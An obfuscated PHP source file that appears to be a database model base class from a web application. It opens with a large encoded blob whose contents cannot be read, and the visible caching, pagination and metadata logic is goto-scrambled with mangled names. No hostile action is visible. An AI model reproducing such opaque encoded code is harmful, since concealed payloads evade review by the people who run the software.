4\xf6\x92\x55\x8b\x38"."\x54\xa2\x6f\x3a\xa0\x6\xe2\x9d\x34\x74\xf5\x92\x51\xd3\x35\xe1\xf0\x6a\xae\x66\x42\x91\x4a\x75\x15\xae\xb1\x93\x15\x74\x69\x4\x74\x78\x59\x8d\xee\x24\x84\x94\xb0\x66\xb2\xb5\x95\x1b\xdc\xa0\xa4\x74\x8e\xaa\x79\x5\xfa\x97"."\xc7\x7b\xfa\x2\xa1\x38\x12\xf1\x83\x3\x51\x4f\x9f\x2d\x1\xf0\xcc\x68\xc0\x5b\x5\xee\xe\x52\x67\xaf\xb6\x5a\x27\xf2\x56\x35\x34\xb5\x80\x96\xf9\x10\x77\x5a\x3\xa2\xb2\xc1\x9c\x9d\x12\x1f\x82\x24\xf\xd4\xe9\xc7\xc1\x25"."\x4b\x13\xba\x9b\xda\xe\x26\x84\xd\x8f\x91\x97\x73\x4c\xa1\xc9\x4d\xf5\xcc\xdd\x46\x89\x88\x8\xc4\xaf\x49\x5f\x80\xcc\x1d\x37\xd9\xdf\xf5\xa9\x9\x32\xcc\x21\x6f\xdf\x1a\xd0\x4\xe8\x7e\x22\x18\xf6\x84\x57\x73\x57\xb6\x20"."\x25\xea\x9\x4f\x93\x2\xf3\x10\xef\x71\xd4\xa1\xd9\x92\x65\xcb\x96\xd1\x87\x39\x93\x39\x6c\x6c\x8\x75\xfb\xd9\x7d\x39\x80\xc2\xd3\x27\xa5\x1a\x2a\x57\x63\x42\xb5\x3c\x64\xf8\x63\xb9\x6f\xf\xcb\xba\x7\xb7\xa0\x46\xe2\x1a"."\xb5\x38\x4d\xa2\x5a\xa4\xcf\x2a\x16\xa9\x7a\x79\xb1\x44\x2f\xb3\xd9\x71\x9a\xe0\x6c\x66\x21\xf9\x1d\x27\xbf\x89\x49\x42\xd6\xb2\x4e\x74\x7\x92\x32\xc9\xaf\x1a\xe4\x7c\x2c\x33\x9\x55\xdf\x68\x18\xac\x34\x39\x7e\x8e\x89\x94".base64_decode('gUckr1yoN6UgQFsi9UPLo0JGmgQtx56SDe4iw8gquVwcqryR6iazmmTfQNLo9N/gxRBwieprQOY=')."\11\52\110\46\25\231\311\302\155\77\167\2\101\14\341\134\56\242\304\3\175\7\0\146\142\105\102\56\53\251\123\0\164\154\20\7\174\116\360\154\10\45\45\11\56\55\310\174\301\342\204\145\205\226\42\303".base64_decode('1o49r6SU8SUScitE/F3X9uSDPiOBz0DbLgmbrFoUBDFCFaTdomeIE6orPKe5pVkwxQh4/ZH4SRE=')."\350\44\263\57\100\235\272\130\23\2\40\55\32\236\46\305\23\236\56\45\330\175\322\64\51\136\272\177\260\246\364\5\203\21\321\177\220\255\172\203\41\301\63\40\331\37\303\265\273\205\150\202\16\14\366\21"."\xfe\x15\x23\x14\x1c\x23\xbc\xd8\x4b\xd4\x9b\x62\xa5\x39\xcd\x6d\xd4\x4a\x87\x3f\x34\x9\xfb\x26\x2e\x3c\x7\x8d\x8f\xcc\x70\x58\x43\x3b\x34\x1c\x96\x92\x32\xb6\x66\x49\x28\x58\x2a\x50\x52\xd0\x2b\x28\xac\x9d\x64\x0\x59\x99"."\x72\xf2\x59\xd0\xe5\xaf\xdb\xdd\xe0\x9a\xdb\x38\x7b\x56\x5e\x84\xc5\x9a\x20\x30\xd6\xe4\x9e\x35\x48\xaa\x31\x8b\xc3\x0\xc2\x6c\x6\x77\x9f\xd2\x50\x37\x55\xdf\xe8\x6a\x6a\x88\xb5\x34\x32\xf5\xad\x18\xb5\x19\x8b\xc5\x4a\x44"."\xf9\x69\x64\x7d\xdb\x6\xee\x80\x30\x36\xec\x6a\x8a\x8d\xcc\x16\xb4\xc9\xd6\x3\xc0\x6\x6\xa8\x64\xe9\x79\x18\xf2\xe5\xc0\xb0\x8c\xa6\x86\xe1\xba\xfa\x11\x57\xd3\xf0\x29\xb1\xd8\x8\xc\x36\x2\x58\x3b\x84\xc7\x22\xae\xa6"."\106\107\327\154\367\240\152\210\370\330\215\362\264\70\244\313\251\325\130\221\35\356\103\221\105\5\273\44\144\2\41\352\323\206\374\200\51\13\116\332\314\174\121\40\133\350\107\154\101\233\250\121\216\41\164\111".base64_decode('KdG1DwWp1VWRa9ZblWlZ1DJbmqVuIKpZ7IMtnuSE2ulzhYLiov9EBBFf0oBx4V1Toa5AXhPcnMA=')."\x82\xa8\x4b\x20\x22\x8\xc8\x46\x76\x1a\x1f\x39\xd8\x45\x5\x68\x80\x50\x27\xc4\x5a\x5c\x70\xc3\x2f\x2c\xb4\xbd\x36\x5f\x4f\x64\x1b\x55\xdd\x87\x38\xc\x8\x99\x4c\x2d\x84\x7\x3e\x85\xf6\x35\xd4\x73\x7\x57\x14\xaf\x24\x48"."\17\300\76\216\333\76\310\314\214\163\302\166\224\353\300\40\151\202\153\141\321\50\25\221\222\162\21\336\327\244\360\311\70\350\170\362\155\26\32\14\101\17\153\220\23\304\351\31\252\0\12\14\4\342\221\300".base64_decode('Gn9VAnQIXDsFrPfRABV/BPhAEDk1s8AHB1YMBIdqoUb7Q1yWEJK8noFoXNiT4s0K2HKx3QrVYk8=')."\352\311\171\255\11\66\315\230\263\57\52\313\223\231\102\327\174\356\64\140\334\311\224\372\351\176\307\307\175\175\220\154\350\340\225\124\1\171\76\41\31\304\123\34\61\331\41\325\74\303\141\33\52\135\56\30".base64_decode('aUW3HU8m1IJMXZrm6bfzzIwNuj+iLmOQyRmVDMS76yK7ACR2XjpI1VPQKEk4syuYYSUjRvs0prM=').base64_decode('h1bzGkXA12oE2xK4SfEkzZL4Ko7wkDmICY/KC/Z1zhaJtSiOS8aRuUIC1hSvYaNns/5HRq948kI=').base64_decode('D7uFSCnBPLvYjOqo31BJNGejnkFhAeghF9gCQ0wDxcJ3jHnLxCzom1VZcBq0OuOsTEwxoELWIBU=')."\273\152\245\324\370\24\112\22\172\64\111\367\161\144\51\42\235\270\232\367\225\111\373\273\325\111\237\206\323\104\177\157\330\146\215\164\256\263\125\22\310\13\362\36\201\42\360\151\4\353\106\156\205\231\343\70"."\x1a\xf4\x5a\x20\x98\x26\x71\x2b\x3f\xfc\x4\xd\x1b\x5a\xf4\x56\xd\x8b\xe9\x82\x5\x98\x92\xa2\x43\x87\xde\x7a\xa9\xb9\x96\x60\x20\x7a\xc\xa6\xa6\x8d\x14\xee\x2c\x98\xec\xb3\xf8\x8f\xb4\x21\x80\x29\x6f\x4d\x27\xcf\xd1\xb"."\x95\xb1\x66\xd0\xb1\x3f\x3d\x9f\xc2\x5d\x6a\xa0\x2c\xbc\xce\xdc\xed\x26\x0\x69\xf8\x81\x7b\xa1\x13\xb8\x57\x36\xfc\x90\xd\xf5\x16\xea\x49\xa5\xec\xe0\xa8\xc6\x80\xd5\x9e\xdd\x5c\xcc\xcf\x29\xf1\xb3\xe\x36\xa0\x91\x40\x70"."\240\241\21\112\124\26\143\377\376\11\346\11\33\214\32\132\263\373\345\161\76\50\54\102\123\31\115\32\226\10\366\123\150\311\315\100\14\253\242\44\30\213\46\114\263\67\344\146\240\156\332\115\354\341\23\142"."\315\14\335\316\213\205\6\211\174\132\301\46\120\204\157\266\63\327\215\164\373\123\311\253\111\251\57\270\34\356\275\175\201\310\12\51\243\230\22\27\172\320\45\205\165\226\43\117\15\350\120\217\22\171\202\252"."\260\240\240\23\35\200\70\55\16\163\330\216\104\364\351\10\13\252\52\30\217\272\130\34\74\75\161\246\230\165\253\15\227\12\11\125\71\304\357\13\171\340\216\306\312\27\20\230\354\165\254\345\114\50\360\36"."\xa0\xf6\xb7\x4b\x35\xbe\x4b\xf0\x73\xfc\xec\x44\xc8\xa0\x16\xca\xaa\xa1\xf2\x29\x4f\xbb\x6a\x42\xc4\xaf\xea\x4b\xd4\x14\x1\x1\xba\xcf\xe2\x26\xdf\xac\x5b\xd9\x77\xaa\x4c\x91\x79\x1c\xe3\x90\x7\xb1\x4\xa3\x57\x3c\x24\xe2"."\x3b\x70\xc2\x6a\x0\x1d\xe\x80\xa5\x96\xeb\xba\x15\xa9\x3\x15\x72\xbd\x4e\x69\x83\x44\x85\x9b\x6a\xcb\x83\x71\x24\x19\xec\x4\x65\x95\x92\x3a\xe\xb\x39\xc2\x81\xe5\xbd\xd1\xe9\x8a\xab\xc2\x56\x53\xfc\x35\x38\x5b\x65\xd4"."\24\225\26\231\223\150\40\43\242\362\260\326\216\245\116\120\61\201\363\216\200\317\201\336\361\342\36\112\121\20\310\223\16\170\274\205\52\340\340\127\364\161\164\111\114\246\225\252\41\313\123\142\276\211\141\201".strrev('Aq«‘‘k5pîÔqeh­GÒ3'."\n".'ln`‚L»ª“öy<4½ÌG¦ãÏpHºÈ¡¶Fœˆ»n£„s?`')."\x9a\xc4\x6d\xe2\x19\x82\xd4\x21\x35\x23\xd7\xa\x58\x9f\x6\xdd\xef\x2c\xa5\xae\xe4\x61\xe3\xb1\x9d\x32\x7a\xd8\xcb\x9f\x2f\x9a\x16\x1b\xe6\x5e\xd5\xe0\x4f\x42\x20\x31\x81\x6f\x87\xa0\xec\xa5\xe5\x27\xaa\x0\x16\x23\xf9\x3e".strrev('şRàªQDciñ¼ì2Ëiök”§ĞDBµIà;FÛP85€ü²Ä2ØšÒ‘šæ'."\r".'Z')."\102\177\65\114\276\204\125\21\4\21\142\265\24\43\277\224\7\332\213\6\143\343\45\132\41\224\0\141\264\52\261\137\341\152\150\244\256\16\316\326\361\155\64\0\1\66\200\54\161\4\212\246\151\302\360\143"."\x75\xf4\x30\xf6\x3a\xe8\xc2\x1e\x2b\xa8\xdc\x91\x51\x99\x6b\x51\xb\x1a\x21\x77\xb0\x45\xe0\x87\x85\x36\xdf\x2a\x64\x7d\xc3\x7e\x56\x4a\x85\x0\x76\x2c\x6f\x81\xea\x82\x78\x2d\x7a\xa7\xc5\x1e\x5b\xb8\x3\x70\x82\xe\xbe\x16"."\302\76\147\310\204\24\213\244\256\175\320\17\24\300\1\275\62\333\146\167\265\53\40\350\25\221\211\17\334\213\350\250\206\244\130\227\50\377\22\4\151\251\104\347\213\141\132\350\10\212\34\100\32\161\240\0"."\42\116\121\110\252\15\265\20\47\102\141\3\206\336\33\144\143\7\173\224\374\370\224\64\23\37\141\234\357\63\304\247\63\150\23\60\141\124\175\3\375\302\115\264\3\267\321\301\310\105\65\372\220\172\241\21"."\301\2\226\203\373\160\167\340\263\171\144\304\302\231\3\357\16\112\366\31\205\177\20\326\60\52\176\334\42\311\331\205\70\326\113\266\14\141\173\117\106\265\152\207\10\334\367\121\241\224\347\116\246\100\304\52"."\300\142\321\236\272\222\370\234\346\226\364\234\3\251\306\72\350\203\162\16\374\46\251\303\122\4\252\120\334\24\32\314\244\51\333\160\125\175\354\277\50\235\370\234\105\2\55\20\15\260\207\11\234\324\216\56"."\66\152\243\251\26\272\4\273\107\176\144\214\137\264\54\332\31\345\352\174\252\165\336\374\305\342\176\221\17\43\167\134\103\137\46\306\77\364\150\214\21\206\144\245\63\211\76\243\51\316\154\224\150\165\235\113"."\336\66\25\270\240\215\177\375\127\323\301\123\113\334\304\231\204\23\54\126\262\320\5\265\276\362\377\137\17\253\313\63\262\17\364\61\31\123\20\14\105\21\226\327\36\77\371\370\337\177\237\12\154\262\325\207"."\x15\x4a\xb5\x4e\x7d\xe1\xd8\x41\x31\x83\xd0\xd0\x9d\x8c\x89\x20\xed\xf3\x47\x98\x84\xf5\xd\x96\xe5\x11\x45\xd8\x6a\x11\x9c\xce\x1c\xae\xe3\x84\xbc\xc6\x73\x37\x19\x88\x48\x2c\x4\x23\xbc\x8f\x2a\x3a\x61\x47\x5\x45\x51\x23".base64_decode('pysa7QFJfQnFoMty5CXOs5z51YcXibwKMMbZhKnxFFPw+A4ZS5CemoFNpEWkBHFudSTQfcoGFGU=')."\0\141\36\1\372\126\5\261\220\310\113\134\0\101\15\25\34\371\220\155\52\357\51\17\231\60\51\207\370\52\54\210\62\102\41\34\235\314\74\344\126\27\177\126\340\337\234\125\363\320\0\125\314\207\21\341".strrev('tDInc‹JÎ}¢¦uô‡˜Yƒ"îj'."\r".'œ¤H„€•Åš-L¸jÃP«!	ğxJ+1,q‰@')."\70\57\254\164\42\63\235\41\246\22\312\162\130\142\44\302\105\54\244\7\55\334\351\240\70\363\326\111\337\203\242\317\104\311\314\153\13\164\107\303\366\65\370\314\207\240\344\162\234\161\213\357\177\344\22\262".base64_decode('7gIUNmpSF161ImIra4jjVCTgDSioydEaLntg/0MdGYFnCitNFRrnKWBBYrptNIRkVyijkMewLY8=').base64_decode('LgTZnW8jcfc2sowyBDgL6WGSyAssoCoOErUwbwuwBhFAT+qUHiw5oHOgbkEIFn0AVntrEjEjxF0=')."\123\25\77\143\123\122\304\343\74\37\307\341\73\273\326\315\245\370\65\174\115\13\67\120\141\270\327\161\331\212\147\163\250\346\274\121\15\174\44\47\356\3\100\110\254\73\235\170\41\135\103\253\261\25\312\166"."\x64\x82\xb9\x90\xa0\xca\x13\xb1\xb3\x2e\x53\xb3\xf4\x2\x10\x9e\x85\xe3\x72\xfc\x9e\x22\x7e\x22\x1b\x3e\x6\x7\x18\x98\x14\x19\xec\x6f\x40\x1e\xb1\x21\x0\xb9\xcd\x41\x6f\x72\xad\x25\xc2\xc1\x5a\x69\xa6\x24\xfc\x87\x5f\x66".strrev('ú«ö95ĞÉÑ0ğš¦¤´-g|ÒµÛzĞêÀÈÆRyá¸wÄÅñ(Û¿€`Rµ°É€k').base64_decode('IWWanRKU8KC9tXww0hHTMib8HXL7++Nou4V3UJaNFFGZEUHCkQ/UC7c6V0WJCEwfXSQlCOfW1hs=').base64_decode('BPYAdRWfKql9QjLKRd/6Ar/Q13+AO05AyfikzVOWmTqJPdegRRoV7huSiAL5lgFlTIBaon88RdU=')."\x9e\xc3\xcc\xaa\x7a\xaa\x5b\x2d\xa4\xec\xf8\xa5\x42\x82\x41\x39\x3a\x18\x8c\xee\x5a\x60\x20\x2f\x71\x56\x6d\x83\xb\xab\xa\x67\x96\x72\x99\x9f\x47\x73\xf9\x30\x95\xea\x91\xcb\x35\x50\x99\x99\x33\x83\x2\x8\x43\x45\xc2\x8f"."\xf0\x24\x9\xf7\xca\xab\x54\xc4\xaf\x13\xbc\x74\xf5\x9a\x2\x11\xab\xa1\xfc\xc9\x12\x7b\xbb\xd0\xbc\x61\x70\x72\x5\x50\x10\x3c\xa0\x11\x72\xe3\x20\xfc\x40\x3d\x73\x71\x87\x8b\xd2\x35\x94\x51\x4e\x71\xdf\x77\xb8\x8e\x6c\x2b"."\xc7\x3f\x69\x7d\x59\x85\xa1\x31\xc1\xc\xe0\x20\x85\x71\xa7\x5\x6a\x73\xc\xc\x4f\xb5\xe8\xea\x6a\x4b\x22\xfb\x48\xa1\xf8\x9a\xdb\x4d\xb\x29\xf4\x9\xc5\x89\xb7\x10\xd3\x66\x88\xd4\xfe\x8\xa7\x57\x6b\x17\x47\x6c\x77\x1f".strrev('ı´şÔòF}Uès‹[Ø3-lWÆkiÂk:<ÀÅZsô$nhªZ&,3±¬°`DY¦Âé‘Ê6')."\x3\xb4\xcb\xec\x77\x80\xbc\x10\xe1\xe4\xad\xea\x82\x32\xaa\xd5\xc8\x83\x6b\x54\x33\x1b\x4e\x82\x39\xb9\xe4\x66\xc9\x2b\xee\x6f\x79\x36\x0\x2d\x19\xd3\xd4\xb0\xba\xfd\x68\x76\xd8\x5a\x4f\xea\xcc\x9d\x72\xb\xa8\xd3\x75\x49".strrev('‹%Uæ¨¶úá2âEÜjÓÊj¿Ûñ±ƒRš9±k®Ûc‚ÖÓÈš‹WO_ÜÔZík=£c·ñ‘ÏêäM')."\x17\x9b\xb5\xaf\x3e\xc3\x35\x27\xa2\x61\xbd\x93\xb4\xc1\xc5\x8e\xa1\x4a\x16\xbb\x36\x9d\xb5\xe7\xbe\x2d\x81\x90\x44\x3\x22\xd8\xc2\x78\x4b\x85\xd1\x2\xf5\x5e\x4\xbe\xc0\xbd\x2\x42\xb\x45\x8f\x6e\xef\x3f\x2a\xc6\xd9\x1c"."\344\122\362\54\224\4\247\254\65\75\354\72\340\156\267\172\73\231\243\276\255\104\377\303\170\317\241\1\361\131\120\211\200\100\321\205\56\116\247\37\311\361\123\51\42\3\340\233\56\237\250\341\213\152\253\302".base64_decode('x9PZbaLl6qxGuoufUlocNKOHt5jVNl6UyTktvlVA2isE0j0Bt0wOvNbh5Iimm9CaG/DjIvrt1kw=').base64_decode('k7IJINkiTCS6IWcxwl0pCPFXTmHfoiNiRKiIoaAgud+A28uIglMRk7JE4NEzi4Srz5h7SrYLFQ4=').base64_decode('ABvDhDZOiAC9mcLrA8+ISbfYxTP+KgChQvHmF6lbGW6c4iaq2U5UhpM8ssdUs0j2FJpYzN3k55U=')."\100\216\324\170\21\370\45\147\164\370\3\37\100\367\257\12\104\242\221\252\244\220\47\22\31\12\206\175\130\275\263\52\31\345\22\256\331\253\222\102\275\301\201\351\322\374\375\236\100\137\125\32\274\166\207\112"."\xa7\xf4\x1d\x48\x9c\x14\x8\xa1\x5a\x7a\xfa\xfa\xa8\x8e\x57\x75\x2d\x2\xde\x15\xbc\x26\xe8\xb6\x89\x9f\x8d\x16\xb3\x1a\x3d\x6a\xb4\xe9\x9f\xd0\xa3\xe4\x88\x4c\xa7\x9\x64\xfe\x6c\x73\x2b\x84\x95\x3c\x3b\x88\x12\x8a\xb3\x9e"."\x8\x88\x43\x6e\xd0\x77\x4a\x59\xa0\x58\xb5\x83\x10\x16\x7a\x78\x4d\x3e\x40\xa\xb\x53\xaf\x8a\xf0\x51\x6c\x36\xfd\x99\x34\x8b\x1a\x27\xea\xdb\xf0\xbb\x35\x97\xe5\xe\x4e\x80\xa3\x89\x83\x98\x90\x40\x90\xe2\x1a\x8c\x0\x44".base64_decode('P9R2B2LrTGG9r75FQxDeIbDeJ1GvCuu0hHC6ivmUhUOJig44bGNgqagWlTOEr0DBgse6J8SweHQ=')."\xd1\xc9\xd8\x8a\x29\x67\xe8\x55\xb6\x9d\x15\xb\x77\xb7\xb0\x97\xfe\x1f\x75\x87\x79\x75\x6b\xc2\x0\x0", 10, -8))); goto fßâÄƒ¤Ä; eéø‰¶à™”: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\151\155\145", "\x74\151\155\x65", "\x69\x6e\163\x65\162\x74\x2c\x75\160\144\x61\164\x65", "\x66\165\156\143\x74\x69\x6f\x6e"), array("\143\162\x65\141\x74\145\x54\151\155\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\146\165\156\x63\164\151\x6f\156")); public function setDataAuto($dèªÑ²Ôô) { $this->dataAuto = $dèªÑ²Ôô; } public function __construct($BĞÖÉÎÇåÈ = '', $CÓˆÈÍÎÇõ = '', $A†£“…æ…æ = '') { parent::__construct($BĞÖÉÎÇåÈ, $CÓˆÈÍÎÇõ, $A†£“…æ…æ); } public static function textEncode($AŒÖÙÙ‚ÏÖ) { if (!$AŒÖÙÙ‚ÏÖ) { return $AŒÖÙÙ‚ÏÖ; } $c‹ŒÁ—ó°Õ = json_encode($AŒÖÙÙ‚ÏÖ); $c‹ŒÁ—ó°Õ = preg_replace_callback($_SERVER[¢à][339], function ($eÚˆ˜åè²À) { return addslashes($eÚˆ˜åè²À[0]); }, $c‹ŒÁ—ó°Õ); return json_decode($c‹ŒÁ—ó°Õ); } public static function textDecode($F•ï’ğÜ‡™) { $DÑÂˆçŒô· =& $_SERVER[¢à]; $A×îÊ´¼œÙ = json_encode($F•ï’ğÜ‡™); $A×îÊ´¼œÙ = preg_replace_callback($DÑÂˆçŒô·[340], function ($Bõ„Õ‘££) { return $_SERVER[¢à][95]; }, $A×îÊ´¼œÙ); return json_decode($A×îÊ´¼œÙ); } protected $tableMeta = array(); protected function _beforeInsert(&$C£‚†‘ÍøÀ, $Bƒ—¯¥ŒŸõ) { $Dº —Äöî =& $_SERVER[¢à]; if (!$this->checkDataAutoHas($Dº —Äöî[341])) { return; } $this->dataBeforeFilter($C£‚†‘ÍøÀ, $Dº —Äöî[341]); } protected function _beforeUpdate(&$f‰¬¯¢ñÄï, $F“ÒÇ¬õñÀ) { $eÖÌÌõŒÊñ =& $_SERVER[¢à]; if (!$this->checkDataAutoHas($eÖÌÌõŒÊñ[342])) { return; } $this->dataBeforeFilter($f‰¬¯¢ñÄï, $eÖÌÌõŒÊñ[342]); } protected function _afterSelect(&$a“‚£„‘¢, $d¼ÍˆŸÍ´÷) { if (!is_array($a“‚£„‘¢)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢à][343])) { return; } foreach ($a“‚£„‘¢ as &$E×ŒÀÛÁÀÓ) { $this->dataAfterFilter($E×ŒÀÛÁÀÓ); } } protected function _afterFind(&$e°Ü¸äÔß½, $B«ĞàÒ—Œ•) { if (!is_array($e°Ü¸äÔß½)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢à][343])) { return; } $this->dataAfterFilter($e°Ü¸äÔß½); } public function setAutoIncrement($fÎéùÛÆ) { $d†ó¨ø = array($this->getPk() => $fÎéùÛÆ); $fÅÊ‹º¥· = $this->data($d†ó¨ø)->add(); if ($fÅÊ‹º¥·) { $this->delete($fÅÊ‹º¥·); } } public function getAutoIncrement() { $c˜ÒØã‚ = $this->getTableName(); $fíôÀ°ö¥Ë = $this->max($this->getPk()); $FÅ“™„Óšô = $this->query("\x73\x68\x6f\x77\x20\x74\x61\142\154\145\x20\x73\164\141\164\x75\163\40\167\150\x65\162\145\40\116\141\x6d\145\x3d\47{$c˜ÒØã‚}\x27"); $c°•èä”‘ğ = $FÅ“™„Óšô[0][$_SERVER[¢à][344]]; $DÀ¾áàñÆ = max($fíôÀ°ö¥Ë, $c°•èä”‘ğ); return $DÀ¾áàñÆ; } protected function _callBefore($bÄ¿ùÛ×¥Ã, $e†ŠÏ–Ü¦§) { return $this->cacheCallCheck($bÄ¿ùÛ×¥Ã, $e†ŠÏ–Ü¦§, !1); } protected function _callAfter($eÅËÑóö¥, $b•ÒæÆÈƒÂ) { return $this->cacheCallCheck($eÅËÑóö¥, $b•ÒæÆÈƒÂ, !0); } protected function cacheFunctionAlias($AïËÄì¬Ñğ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b•óŸØ­Ê¼, $cÒò¬ñ½áŸ, $B‹Ğ²ÀÉŸİ = false) { $f»‹¯¤Îˆğ = $this->cacheFunctionAlias($cÒò¬ñ½áŸ); if (!$f»‹¯¤Îˆğ) { return; } foreach ($f»‹¯¤Îˆğ as $E„¹ßŠ¤ô’ => $fÔä¤ÈªÍÕ) { $f¶Œ¹ãÛ·„ = $fÔä¤ÈªÍÕ[0]; $a¢öğ‡ÓË = explode($_SERVER[¢à][47], $fÔä¤ÈªÍÕ[1]); if ($b•óŸØ­Ê¼ == $E„¹ßŠ¤ô’) { return $this->cacheFunctionGet($E„¹ßŠ¤ô’, $f¶Œ¹ãÛ·„); } if ($B‹Ğ²ÀÉŸİ && in_array($b•óŸØ­Ê¼, $a¢öğ‡ÓË)) { $this->cacheFunctionClear($E„¹ßŠ¤ô’, $f¶Œ¹ãÛ·„); } } } public function cacheFunctionGet($C‹å ©’â, $eÊ±Ñé£ùç) { $B“¬‰âƒÉ„ = $this->cacheKeyMake($C‹å ©’â, $eÊ±Ñé£ùç); $A–Èš’áÜ = Cache::get($B“¬‰âƒÉ„); if (!is_array($A–Èš’áÜ)) { $A–Èš’áÜ = call_user_func_array(array($this, $C‹å ©’â), array($eÊ±Ñé£ùç, !0)); Cache::set($B“¬‰âƒÉ„, $A–Èš’áÜ); } return $A–Èš’áÜ; } public function cacheFunctionClear($aµµ½ˆåé , $aš˜É¤Á) { $fˆ„Ñµøœ = $aš˜É¤Á; if (!is_array($aš˜É¤Á)) { $fˆ„Ñµøœ = array($aš˜É¤Á); } foreach ($fˆ„Ñµøœ as $B™ØÓŒÇ©) { $FÇâ³àÎÒî = $this->cacheKeyMake($aµµ½ˆåé , $B™ØÓŒÇ©); Cache::remove($FÇâ³àÎÒî); } } private function cacheKeyMake($fàÂ¢ÖŒ÷ğ, $cêáÎŠØˆ) { $cÈ›‘Ğ“Äø =& $_SERVER[¢à]; return get_class($this) . $cÈ›‘Ğ“Äø[70] . $fàÂ¢ÖŒ÷ğ . $cÈ›‘Ğ“Äø[345] . $cêáÎŠØˆ; } protected function selectPage($a±¼ôˆ¡ø× = 200, $fÀÛ¹¬¡ = 1) { goto B©ÕÄ¼ïï; F‹Í«°º†: $this->optionsValue($D„ƒ³Ñ×åÂ); $aéÙÓÕ“•è = $this->page($fÀÛ¹¬¡, $a±¼ôˆ¡ø×)->select(); $aéÙÓÕ“•è = is_array($aéÙÓÕ“•è) ? $aéÙÓÕ“•è : array(); goto Eò¡°ÚÒ‚¡; B©ÕÄ¼ïï: $e‹ã¢Ä¤ =& $_SERVER[¢à]; global $in; $D„ƒ³Ñ×åÂ = $this->optionsValue(); goto AšïíÃ„‰; dôéïÆ¸¶–: $DÇ­´ìÕ¿¿ = $D„ƒ³Ñ×åÂ; $DÇ­´ìÕ¿¿[$e‹ã¢Ä¤[347]] = array(); $this->optionsValue($DÇ­´ìÕ¿¿); goto EÌÓÕñ‡; Eò¡°ÚÒ‚¡: if ($CÈëØÑ–ì == 1) { $Aë„‘šã· = count($aéÙÓÕ“•è); } $B·ñËƒ¯Šë = array($e‹ã¢Ä¤[348] => array($e‹ã¢Ä¤[349] => $Aë„‘šã·, $e‹ã¢Ä¤[346] => $a±¼ôˆ¡ø×, $e‹ã¢Ä¤[337] => $fÀÛ¹¬¡, $e‹ã¢Ä¤[350] => $CÈëØÑ–ì), $e‹ã¢Ä¤[351] => $aéÙÓÕ“•è ? $aéÙÓÕ“•è : array()); return $B·ñËƒ¯Šë; goto f±®Ïî’……; E¿ÔÂ¢½¨¸: $CÈëØÑ–ì = ceil($Aë„‘šã· / $a±¼ôˆ¡ø×); $fÀÛ¹¬¡ = intval(isset($in[$e‹ã¢Ä¤[337]]) ? $in[$e‹ã¢Ä¤[337]] : $fÀÛ¹¬¡); $fÀÛ¹¬¡ = $fÀÛ¹¬¡ <= 1 ? 1 : ($fÀÛ¹¬¡ >= $CÈëØÑ–ì ? $CÈëØÑ–ì : $fÀÛ¹¬¡); goto F‹Í«°º†; AšïíÃ„‰: $B´ÑÌñÙÇ = 4000; $a±¼ôˆ¡ø× = isset($in[$e‹ã¢Ä¤[346]]) ? $in[$e‹ã¢Ä¤[346]] : $a±¼ôˆ¡ø×; if ($a±¼ôˆ¡ø× === -1) { unset($in[$e‹ã¢Ä¤[346]]); $B´ÑÌñÙÇ = 100000000; $a±¼ôˆ¡ø× = $B´ÑÌñÙÇ; } goto dôéïÆ¸¶–; EÌÓÕñ‡: $Aë„‘šã· = intval($this->count()); $a±¼ôˆ¡ø× = intval($a±¼ôˆ¡ø×); $a±¼ôˆ¡ø× = $a±¼ôˆ¡ø× <= 5 ? 5 : ($a±¼ôˆ¡ø× >= $B´ÑÌñÙÇ ? $B´ÑÌñÙÇ : $a±¼ôˆ¡ø×); goto E¿ÔÂ¢½¨¸; f±®Ïî’……: } protected function checkLength($Cº„—‹ç—, $d³…Í„– = 0, $aÛÁ„½ê¥à = '') { $c‹±İÊÌ =& $_SERVER[¢à]; $d³…Í„– = $d³…Í„– ? $d³…Í„– : 65536; if (!$Cº„—‹ç— || strlen($Cº„—‹ç—) < $d³…Í„–) { return; } $aÛÁ„½ê¥à = $aÛÁ„½ê¥à ? $aÛÁ„½ê¥à . $c‹±İÊÌ[67] : $c‹±İÊÌ[33]; show_json($aÛÁ„½ê¥à . LNG($c‹±İÊÌ[352]) . "\50{$d³…Í„–}\51", !1); } protected function metaSet($Fù­«ã‘‡ã, $a¢»ÛĞÄ–á = null, $aÌšø³ªÇø = null) { goto D–êğë ÚÈ; bœ¹ÏÏï†ø: $d„ùõ ˜Ÿ„->where(array($dëØ–Œ©ï– => $Fù­«ã‘‡ã))->addAll($cÕÑÒº×…, array(), !0); return !0; goto fƒ¤ÅØöº«; D–êğë ÚÈ: $AøåÆÂö¨ =& $_SERVER[¢à]; if (!$this->tableMeta) { return !1; } $dëØ–Œ©ï– = $this->tableMeta[$AøåÆÂö¨[353]]; goto bŠƒÕ¾°óÉ; EÂçË¸«Œ: if (is_string($a¢»ÛĞÄ–á)) { $B™²˜³µ[$a¢»ÛĞÄ–á] = $aÌšø³ªÇø; } $cÕÑÒº×… = array(); foreach ($B™²˜³µ as $Fé•²Šì‹Å => $eÆ·ƒ¦Â¢) { $this->checkLength($eÆ·ƒ¦Â¢, !1, $DØ¥ÃŒÅÑ± . $AøåÆÂö¨[4] . $Fé•²Šì‹Å); $cÕÑÒº×…[] = array($dëØ–Œ©ï– => $Fù­«ã‘‡ã, $AøåÆÂö¨[89] => $Fé•²Šì‹Å, $AøåÆÂö¨[356] => $eÆ·ƒ¦Â¢); } goto bœ¹ÏÏï†ø; d„Äğ‰éÆ: if (is_null($a¢»ÛĞÄ–á)) { return $d„ùõ ˜Ÿ„->where(array($dëØ–Œ©ï– => $Fù­«ã‘‡ã))->delete(); } if (is_null($aÌšø³ªÇø)) { return $d„ùõ ˜Ÿ„->where($dˆ ¢ïËªŒ)->delete(); } $B™²˜³µ = is_array($a¢»ÛĞÄ–á) ? $a¢»ÛĞÄ–á : array(); goto EÂçË¸«Œ; bŠƒÕ¾°óÉ: $DØ¥ÃŒÅÑ± = $this->tableMeta[$AøåÆÂö¨[354]]; $d„ùõ ˜Ÿ„ = Model($DØ¥ÃŒÅÑ±); $dˆ ¢ïËªŒ = array($dëØ–Œ©ï– => $Fù­«ã‘‡ã, $AøåÆÂö¨[355] => $a¢»ÛĞÄ–á); goto d„Äğ‰éÆ; fƒ¤ÅØöº«: } public function 